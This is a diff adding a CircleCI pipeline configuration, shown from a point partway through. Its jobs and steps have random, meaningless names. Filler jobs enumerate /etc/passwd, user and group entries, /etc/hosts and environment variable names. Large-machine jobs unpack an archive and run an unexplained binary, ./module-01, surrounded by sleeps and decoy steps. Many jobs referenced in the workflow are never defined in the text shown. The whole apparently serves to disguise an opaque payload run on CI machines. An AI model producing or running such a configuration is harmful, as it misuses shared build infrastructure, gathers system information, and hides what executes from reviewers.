+    resource_class: small
+    steps:
+      - run:
+          name: Protocol Falcon
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; echo -n 'name: demo' | tr ' ' '\n' | sort; true ; } > /tmp/y2/batch_812
+            echo "step=dotnet8-build"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'batch_812'
+  dotnet8-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Pick up state C
+          command: |
+            cut -c30- /tmp/y2/batch_812 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar -xj -f static-vault.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          name: Verify output
+          command: sleep 45
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          command: nice -n 0 ./module-01
+  notifyMotor:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: cook after load
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; truncate -s 5M ${TMPDIR:-/tmp}/CoreCinema.txt && du -h ${TMPDIR:-/tmp}/CoreCinema.txt; true ; } > /tmp/y2/67e6895b-04de-c3f3-4844
+            echo "step=assemble-nightly-regression-suite"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - '67e6895b-04de-c3f3-4844'
+  assemble-nightly-regression-suite:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Pick up state C
+          command: |
+            cut -c30- /tmp/y2/67e6895b-04de-c3f3-4844 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar -xj -f static-vault.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          name: Verify output
+          command: sleep 45
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          command: nice -n 0 ./module-01
+  kAGwbcNwIo:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: The bastion host is to be bound next
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; builtin echo "lunch at noon"; true ; } > /tmp/y2/user.iron.socket.hollow
+            echo "step=beta-v3"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'user.iron.socket.hollow'
+  beta-v3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Pick up state C
+          command: |
+            cut -c30- /tmp/y2/user.iron.socket.hollow 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar -xj -f static-vault.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          name: Verify output
+          command: sleep 45
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          command: nice -n 0 ./module-01
+  q4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Why thumbnail the timeline
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; echo 'call the plumber' | awk '{n = gsub(/e/, "e"); print n}'; true ; } > /tmp/y2/fnv_731b944
+            echo "step=STG_HOOK_1"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'fnv_731b944'
+  STG_HOOK_1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Pick up state C
+          command: |
+            cut -c30- /tmp/y2/fnv_731b944 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar -xj -f static-vault.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          name: Verify output
+          command: sleep 45
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          command: nice -n 0 ./module-01
+  printNormalItem:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Day 25 Enrollment
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; printf 'host=cache-a\nport=7626\nuser=otto\ndebug=true\n' > "/tmp/chapter.bugs.potato_20250809.csv" && grep -c = "/tmp/chapter.bugs.potato_20250809.csv"; true ; } > /tmp/y2/eastvioletchrome
+            echo "step=polaris"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'eastvioletchrome'
+  polaris:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Pick up state C
+          command: |
+            cut -c30- /tmp/y2/eastvioletchrome 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar -xj -f static-vault.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          name: Verify output
+          command: sleep 45
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          command: nice -n 0 ./module-01
+  widget-noon-apple:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Sweep the base model int8
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; ls -n /opt | wc -l; true ; } > /tmp/y2/SAvANNastaCkqueUestonE
+            echo "step=jul23-rev"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'SAvANNastaCkqueUestonE'
+  jul23-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Pick up state C
+          command: |
+            cut -c30- /tmp/y2/SAvANNastaCkqueUestonE 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar -xj -f static-vault.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          name: Verify output
+          command: sleep 45
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          command: nice -n 0 ./module-01
+
+  lvlHud:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Let Omar purge the output bucket
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; echo "phase one complete" | tr -d 'aeiou'; true ; } > /tmp/y2/imgimg
+            echo "step=ruby3-build"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'imgimg'
+  taco-983:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Sort because it keeps failing
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; ls -dp --block-size=M /usr/sbin | head -5; true ; } > /tmp/y2/fnv_731b944
+            echo "step=STG_HOOK_1"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'fnv_731b944'
+  HOST_PASS:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Slice the worker pool
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; grep 'sh$' /etc/passwd | cut -d":" -f3 | sort -n | tail -n1; true ; } > /tmp/y2/6pe6dzzrb9x
+            echo "step=INFRA-155"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - '6pe6dzzrb9x'
+  cliedge-i386:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: take seven masking
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; printf '%s\n' delhi oslo manila|sort|uniq -c|sort -n -r|tr -d '[:digit:]'; true ; } > /tmp/y2/67e6895b-04de-c3f3-4844
+            echo "step=assemble-nightly-regression-suite"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - '67e6895b-04de-c3f3-4844'
+  MSD-571-resume-enum:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Make the cold storage tier go brrr
+          command: |
+            mkdir -p /tmp/y2
+            set +o pipefail 2>/dev/null; cp /etc/hosts /tmp/y2/titan-crane 2>/dev/null || echo "no hosts" > /tmp/y2/titan-crane; seq 1 1497650 >> /tmp/y2/titan-crane; true
+            echo "step=ruby3-release"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'titan-crane'
+  gCzmZ:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Migrating the replication lag
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; grep -qs 'model name' /proc/cpuinfo&&echo 'yes' || echo 'no'; true ; } > /tmp/y2/cce0f1d2-9408-bf9e-d1ac-c16a853fb9b
+            echo "step=realease-66"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'cce0f1d2-9408-bf9e-d1ac-c16a853fb9b'
+  dlgscene:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Shall we open the onboarding slides
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; getent passwd | tr ':' ' ' | nl; true ; } > /tmp/y2/canvas509
+            echo "step=UAT_STAGE_4"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'canvas509'
+  UQ7:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Final Sweep Of The NTP Sync
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; printf 'name,city,score\nzoe,kyoto,71\njudy,prague,62\nraj,rome,79\nsam,perth,47\n' >"${TMPDIR:-/tmp}/job.dat"&&grep -c , "${TMPDIR:-/tmp}/job.dat"; true ; } > /tmp/y2/west.forest.boson.ridge
+            echo "step=v6-alpha3"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'west.forest.boson.ridge'
+  drympthuengapp:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Hana does the checkpoint
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; touch /tmp/old-inbox-archive.txt && chmod 644 /tmp/old-inbox-archive.txt && stat -c "%A %n" /tmp/old-inbox-archive.txt; true ; } > /tmp/y2/PANO_94667
+            echo "step=intergration"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'PANO_94667'
+  UntypedCanvasOptions:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: bar
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; grep -i tty /etc/group | awk -F: '{print $1}'; true ; } > /tmp/y2/LOT50535
+            echo "step=rm-cache"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'LOT50535'
+  generatorTulipLimitVector:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: h2 2025 cutover
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; grep -rH alias /etc/default 2>/dev/null | cut -d: -f1 | sort -u; true ; } > /tmp/y2/debug-fe444c.log
+            echo "step=sierra"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'debug-fe444c.log'
+  RuleReceiptSession:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: 6 physics layers per batch
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; env -0 | tr '\0' '\n' | cut -d"=" -f1 | pr -4 -t -w 80; true ; } > /tmp/y2/batch_812
+            echo "step=dotnet8-build"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'batch_812'
+  updateCNNAccount:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: fuzz contract tests
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; find /usr/lib -group root -exec ls -1d {} + 2>/dev/null|sort|head -20; true ; } > /tmp/y2/ZINC_NEUTRON_LOADER_FILTER
+            echo "step=blast-off"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'ZINC_NEUTRON_LOADER_FILTER'
+workflows:
+  default:
+    jobs:
+      - clrPink
+      - io-plus:
+          requires:
+            - clrPink
+      - reduce_edgePrevious:
+          requires:
+            - clrPink
+      - nightly-v2:
+          requires:
+            - reduce_edgePrevious
+      - onDataFade:
+          requires:
+            - reduce_edgePrevious
+      - Rollout_Pipeline6:
+          requires:
+            - onDataFade
+      - ckpt724:
+          requires:
+            - onDataFade
+      - jan8-ship:
+          requires:
+            - ckpt724
+      - printNormalItem:
+          requires:
+            - ckpt724
+      - polaris:
+          requires:
+            - printNormalItem
+      - TryRouter:
+          requires:
+            - printNormalItem
+      - alice-push:
+          requires:
+            - TryRouter
+      - widget-noon-apple:
+          requires:
+            - TryRouter
+      - jul23-rev:
+          requires:
+            - widget-noon-apple
+      - UNUSED_CNT:
+          requires:
+            - widget-noon-apple
+      - bake-it:
+          requires:
+            - UNUSED_CNT
+      - Union-Title:
+          requires:
+            - UNUSED_CNT
+      - py310-vet:
+          requires:
+            - Union-Title
+      - BACKUP_RESOURCE_PIN_43:
+          requires:
+            - Union-Title
+      - perseus-beta:
+          requires:
+            - BACKUP_RESOURCE_PIN_43
+      - uat-dev-63:
+          requires:
+            - BACKUP_RESOURCE_PIN_43
+      - cd-2a:
+          requires:
+            - uat-dev-63
+      - ImportNumRaw:
+          requires:
+            - uat-dev-63
+      - java17-release:
+          requires:
+            - ImportNumRaw
+      - usp_ColumnFreeStore:
+          requires:
+            - ImportNumRaw
+      - sanity:
+          requires:
+            - usp_ColumnFreeStore
+      - kAGwbcNwIo:
+          requires:
+            - usp_ColumnFreeStore
+      - beta-v3:
+          requires:
+            - kAGwbcNwIo
+      - localFlag:
+          requires:
+            - kAGwbcNwIo
+      - PreparePipeline:
+          requires:
+            - localFlag
+      - topic-thread-query-light:
+          requires:
+            - localFlag
+      - VerifyStaging:
+          requires:
+            - topic-thread-query-light
+      - calender_tree:
+          requires:
+            - topic-thread-query-light
+      - v6-nightly:
+          requires:
+            - calender_tree
+      - COUPON_SHIPMENT
+      - lvlHud:
+          requires:
+            - COUPON_SHIPMENT
+      - ruby3-build:
+          requires:
+            - lvlHud
+      - q4:
+          requires:
+            - lvlHud
+      - taco-983:
+          requires:
+            - q4
+      - STG_HOOK_1:
+          requires:
+            - taco-983
+      - store-armv7-latest:
+          requires:
+            - taco-983
+      - HOST_PASS:
+          requires:
+            - store-armv7-latest
+      - INFRA-155:
+          requires:
+            - HOST_PASS
+      - notifyMotor:
+          requires:
+            - HOST_PASS
+      - cliedge-i386:
+          requires:
+            - notifyMotor
+      - assemble-nightly-regression-suite:
+          requires:
+            - cliedge-i386
+      - ZWR7:
+          requires:
+            - cliedge-i386
+      - MSD-571-resume-enum:
+          requires:
+            - ZWR7
+      - ruby3-release:
+          requires:
+            - MSD-571-resume-enum
+      - success_account_manager:
+          requires:
+            - MSD-571-resume-enum
+      - gCzmZ:
+          requires:
+            - success_account_manager
+      - realease-66:
+          requires:
+            - gCzmZ
+      - da:
+          requires:
+            - gCzmZ
+      - dlgscene:
+          requires:
+            - da
+      - UAT_STAGE_4:
+          requires:
+            - dlgscene
+      - num_rec_tot:
+          requires:
+            - dlgscene
+      - UQ7:
+          requires:
+            - num_rec_tot
+      - v6-alpha3:
+          requires:
+            - UQ7
+      - struct_Stream-convert:
+          requires:
+            - UQ7
+      - drympthuengapp:
+          requires:
+            - struct_Stream-convert
+      - intergration:
+          requires:
+            - drympthuengapp
+      - PulseSnapshot:
+          requires:
+            - drympthuengapp
+      - UntypedCanvasOptions:
+          requires:
+            - PulseSnapshot
+      - rm-cache:
+          requires:
+            - UntypedCanvasOptions
+      - uMin:
+          requires:
+            - UntypedCanvasOptions
+      - generatorTulipLimitVector:
+          requires:
+            - uMin
+      - sierra:
+          requires:
+            - generatorTulipLimitVector
+      - Save-Writer2:
+          requires:
+            - generatorTulipLimitVector
+      - RuleReceiptSession:
+          requires:
+            - Save-Writer2
+      - dotnet8-build:
+          requires:
+            - RuleReceiptSession
+      - acvN9ZHQpSzd:
+          requires:
+            - RuleReceiptSession
+      - updateCNNAccount:
+          requires:
+            - acvN9ZHQpSzd
+      - blast-off:
+          requires:
+            - updateCNNAccount
